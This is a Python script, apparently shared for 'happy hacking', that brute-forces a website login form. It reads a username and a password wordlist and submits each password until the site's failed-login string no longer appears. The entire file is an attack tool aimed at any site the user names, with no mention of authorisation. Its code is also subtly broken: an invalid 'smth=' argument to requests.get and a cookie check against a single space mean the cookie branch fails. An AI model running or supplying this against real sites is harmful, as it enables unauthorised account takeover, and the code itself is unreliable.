import requests 

URL=input('[+] Enter Site URL: ')#please do keep in mind its a postform bruteforcer, if youd like to change it to be a get post brutforcer you will need to tweak options around here. Thanks for reading happy hacking:)

U_name=input('[+] Enter Username For bruteforcing: ')
PWF=input('[++] Enter Password File Name Here: ')
login_failed =input('[+] Try and log in to set site and past the failed login string here: ')
Cookie_val=input('[+] Enter The Cookie Value(*)If not needed leave empty: ')

def  forcing(U_name,URL):
	for password in passwords:
		password=password.strip()
		print(f'Trying {password} ')
		data = {'username':U_name,'password':password,'Login':'Submit'}#Keep it in mind all of these might need to be changed as the sites request them, the last part is the login button(submit or whatever they call him where you bruteforce)	
		if Cookie_val != ' ':
				response = requests.get(URL, smth={'username':U_name,'password':password,'Login':'Login '} ,  cookies  = {'Cookie':Cookie_val })
		else:
				response = requests.post(URL,data=data)
		if login_failed in response.content.decode():
			pass
		else:
			print(f'Sucsess we got a login Uname {U_name} and  for [+] {password} [+]')  
			exit() 



with open(PWF, 'r' ) as passwords:
	forcing(U_name,URL)


print('Password Is not In Given list')
	
